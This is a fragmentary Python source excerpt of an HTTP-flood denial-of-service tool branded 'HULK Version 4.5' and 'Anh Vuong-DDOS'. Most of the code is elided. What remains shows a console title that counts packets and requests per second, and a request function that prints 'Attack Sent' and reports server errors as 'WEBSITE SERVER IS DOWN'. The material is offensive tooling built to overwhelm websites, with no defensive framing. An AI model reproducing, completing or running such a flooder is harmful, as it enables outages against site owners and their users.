...
def update_title(pps, requests_per_seconds):
    title = f"HTTP-REQUESTS | Anh Vuong  Attack Sent | PPS: {pps} | RQS: {requests_per_seconds}"
    if os.name == 'nt':
...
def send_request(url):
    ...
    try:
        ...
        if status == 200:
            print(f"HTTP-REQUESTS | Anh Vuong Attack Sent | Status: 200")
        elif status == 500:
            print(f"HTTP-REQUESTS | Anh Vuong Attack Sent | Status: 500 ERROR WEBSITE SERVER IS DOWN")
        else:
            print(f"HenryNET-ATTACK | HULK Version 4.5 | Status: {status}")
...
DISTRIBUTED DENIAL OF SERVICE | BY Anh Vuong-DDOS
